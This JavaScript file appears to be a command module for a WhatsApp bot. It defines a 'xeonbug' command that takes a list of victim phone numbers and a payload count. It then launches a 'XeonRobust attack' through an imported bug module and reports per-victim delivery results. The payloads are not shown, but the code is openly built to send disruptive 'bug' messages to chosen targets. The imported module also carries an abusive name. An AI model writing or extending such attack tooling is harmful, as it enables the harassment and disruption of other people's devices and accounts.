// File: commands/xeonbug.js
const { keith } = require("../keizzah/keith");
const xeonRobust = require("../keizzah/bugs/rape");

const mess = {
    prem: "⚠️ You are not authorized to use this command!",
    usage: (prefix) => `Usage: ${prefix}xeonbug amount | numbers\nExample: ${prefix}xeonbug 5 | 254712345678 or ${prefix}xeonbug 254712345678,254798765432`
};

keith(
    {
        nomCom: "xeonbug",
        categorie: "bug",
        reaction: "💣"
    },
    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        
        // Authorization check
        if (!superUser) return await repondre(mess.prem);

        // Command syntax check
        if (!arg[0]) return await repondre(mess.usage(prefixe));

        try {
            // Parse arguments
            const args = arg.join(" ").split("|").map(a => a.trim());
            let amount = 5;
            let victims = [];

            if (args.length === 1) {
                // Single number case
                victims = args[0].includes(',') ? 
                    args[0].split(',').map(v => v.trim()) : 
                    [args[0]];
            } else {
                // Amount and numbers specified
                amount = parseInt(args[0]) || 5;
                victims = args[1].split(',').map(v => v.trim()).filter(v => v);
            }

            // Validate amount
            amount = Math.min(amount, xeonRobust.config.MAX_BUGS);
            if (amount < 1) return await repondre("Amount must be at least 1");

            // Validate victims
            if (victims.length === 0) return await repondre("No valid numbers provided");

            // Execute attack
            await repondre(`💣 Launching XeonRobust attack (${amount} payloads)...`);
            const results = await xeonRobust.send(dest, zk, commandOptions, victims, amount);

            // Generate report
            const report = results.map(r => {
                if (r.status === 'invalid') return `❌ ${r.victim} - Invalid format`;
                return r.failed > 0 ? 
                    `⚠️ ${r.victim} - ${r.sent}/${amount} sent (${r.failed} failed)` :
                    `✅ ${r.victim} - ${r.sent} sent successfully`;
            }).join('\n');

            await repondre(`📊 Attack Report:\n${report}`);

        } catch (error) {
            console.error("XeonRobust command error:", error);
            await repondre(`❌ Critical error: ${error.message}`);
        }
    }
);
